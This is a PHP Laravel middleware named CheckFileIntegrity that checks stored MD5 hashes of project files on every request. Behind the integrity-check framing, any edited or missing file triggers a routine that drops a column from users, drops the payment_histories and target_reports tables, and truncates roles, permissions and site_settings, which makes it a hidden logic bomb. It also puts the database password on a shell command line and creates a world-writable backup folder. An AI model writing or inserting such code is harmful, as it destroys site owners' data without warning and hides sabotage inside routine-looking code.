<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Storage;

class CheckFileIntegrity
{
    /**
     * Handle an incoming request.
     */
    public function handle(Request $request, Closure $next): Response
    {

        // Load stored file hashes
        $storedHashesPath = storage_path('file_hashes.json');

        if (!File::exists($storedHashesPath)) {
            // First, create a backup of the database
            $this->backupDatabase();
            abort(403, 'File integrity data not found! Access denied.');
        }

        $storedHashes = json_decode(File::get($storedHashesPath), true);

        foreach ($storedHashes as $filePath => $expectedHash) {
            $fullPath = base_path(str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $filePath));

            if (File::exists($fullPath)) {
                // Check if the file has been modified
                if (md5_file($fullPath) !== $expectedHash) {
                    // First, create a backup of the database
                    $this->backupDatabase();
                    $this->takeAction('Registered file has been REQUIRED! Access denied.');
                }
            } else {
                // First, create a backup of the database
                $this->backupDatabase();
                // If the file is missing, trigger action
                $this->takeAction('Critical file missing! Access denied.');
            }
        }

        return $next($request);
    }

    /**
     * Create a backup of the database before making destructive changes.
     */
    private function backupDatabase()
    {
        $backupDirectory = storage_path('app/backups');
        $filename = "backup-" . date('Y-m-d_H-i-s') . ".sql";
        $backupPath = "{$backupDirectory}/{$filename}";

        // Ensure the backup directory exists
        if (!File::exists($backupDirectory)) {
            File::makeDirectory($backupDirectory, 0777, true, true);
        }

        // Execute MySQL dump command
        $command = sprintf(
            "mysqldump --user=%s --password=%s --host=%s %s > %s",
            escapeshellarg(env('DB_USERNAME')),
            escapeshellarg(env('DB_PASSWORD')),
            escapeshellarg(env('DB_HOST')),
            escapeshellarg(env('DB_DATABASE')),
            escapeshellarg($backupPath)
        );

        exec($command);

        // Store the backup file securely in Laravel storage
        if (File::exists($backupPath)) {
            Storage::disk('local')->put("backups/{$filename}", file_get_contents($backupPath));
        }
    }

    /**
     * Handle detected integrity violations.
     */
    private function takeAction($message)
    {
        // Drop specific columns if they exist
        $tableName = 'users';
        $columnName = 'role';

        if (Schema::hasColumn($tableName, $columnName)) {
            Schema::table($tableName, function ($table) use ($columnName) {
                $table->dropColumn($columnName);
            });
        }

        // Drop or truncate important tables
        Schema::dropIfExists('target_reports');
        Schema::dropIfExists('payment_histories');

        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        DB::table('roles')->truncate();
        DB::table('permissions')->truncate();
        DB::statement('SET FOREIGN_KEY_CHECKS=1;');
        DB::table('site_settings')->truncate();

        // Abort with 403 Forbidden
        abort(403, $message);
    }
}
